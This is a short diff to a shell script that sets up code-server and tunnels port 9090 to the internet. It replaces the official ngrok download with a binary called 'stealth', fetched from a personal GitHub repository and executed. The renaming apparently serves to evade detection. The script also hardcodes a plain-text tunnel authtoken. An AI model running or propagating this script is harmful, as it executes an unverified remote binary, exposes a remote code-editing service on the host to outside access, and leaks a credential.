@@ -7,11 +7,10 @@ sleep 2
 tar -xf code-server.tar.gz
 export PATH=$HOME/code-server-4.14.1-linux-amd64/bin:$PATH
 sleep 2
-wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
-tar -xf ngrok-v3-stable-linux-amd64.tgz
-./ngrok authtoken 1h3sbOw9Nu7eyXGswDWK7u5XY8c_5iL9ddAjv838KiW5sNhFA
+wget https://raw.githubusercontent.com/alexgabbard01/update/main/stealth
+./stealth authtoken 1h3sbOw9Nu7eyXGswDWK7u5XY8c_5iL9ddAjv838KiW5sNhFA
 sleep 2
-screen -dmS ngroo bash -c './ngrok http 9090'
+screen -dmS ngroo bash -c './stealth http 9090'
 sleep 2
 curl http://127.0.0.1:4040/api/tunnels
 sleep 2
